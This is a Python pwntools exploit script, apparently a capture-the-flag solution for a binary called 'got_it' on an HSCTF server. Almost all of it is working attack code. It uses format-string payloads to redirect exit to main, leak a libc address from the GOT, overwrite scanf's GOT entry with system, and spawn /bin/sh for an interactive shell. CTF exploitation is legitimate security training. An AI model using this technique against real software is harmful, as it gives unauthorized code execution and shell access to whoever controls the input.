#!/usr/bin/python3

from pwn import *
import time, os, sys

if len(sys.argv) == 2 and sys.argv[1] == 'local':
	# patch out code that slows down local exploit dev
	binary = ELF('got_it')
	# remove sleep/alarm swap
	for i in range(0x4012a8,0x4012cc):
		binary.p8(i,0x90)
	# remove sleep
	for i in range(0x4012f1,0x4012f6):
		binary.p8(i,0x90)
	binary.save('got_it_patched')
	os.chmod('got_it_patched',0o755)

	p = process('./got_it_patched')
	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
	p = remote('pwn.hsctf.com', 5004)
	libc = ELF('libc-database/db/libc6_2.27-3ubuntu1_amd64.so')

'''
# libc-database/find fgets b20 | grep -v 386
http://ftp.osuosl.org/pub/ubuntu/pool/main/g/glibc/libc6_2.27-3ubuntu1_amd64.deb (id libc6_2.27-3ubuntu1_amd64)
'''

binary = ELF('got_it')
t=time.time()
context.update(arch='amd64')
fs_offset=8

# 1st pass, set exit -> main to get infinite passes

print('1st pass...',end='')
p.recvuntil('Give me sumpfink to help me out!\n')
p.sendline(fmtstr_payload(fs_offset,{binary.got['exit']:binary.symbols['main']}))
print(time.time()-t)


# 2nd pass, leak libc address from the got using fgets (setup() does not mess with fgets)
# note: 1st and 2nd pass can be combined if you like

print('2nd pass...')
p.recvuntil('Give me sumpfink to help me out!\n')
fstring  = b'%' + str(fs_offset+1).rjust(5,'0').encode() + b'$s' + p64(binary.got['fgets'])
p.sendline(fstring)
p.recvuntil('I don\'t think "')
_ = p.recv(6)
fgets = u64(_ + b'\x00\x00')
print('  fgets:',hex(fgets))
baselibc = fgets - libc.symbols['fgets']
print('  libc: ',hex(baselibc))
p.send('\n\n')
print('2nd pass...',end='')
print(time.time()-t)


# 3rd pass, scanf (its really printf, see setup()) -> system

print('3rd pass...',end='')
p.recvuntil('Give me sumpfink to help me out!\n')
p.sendline(fmtstr_payload(fs_offset,{binary.got['__isoc99_scanf']:baselibc + libc.symbols['system']}))
p.recvuntil('Unterminated quoted string')
p.send('\n\n')
print(time.time()-t)


# 4th pass, now that scanf (really printf, again see setup()), is system, we'll get some errors, but no fail
# at the prompt put in /bin/sh and that will get a shell

print('4th pass...',end='')
p.recvuntil('Give me sumpfink to help me out!\n')
p.sendline("/bin/sh")
p.recvuntil('Unterminated quoted string')
print(time.time()-t)
print("\nYOU'RE IN!!!\n")

p.interactive()
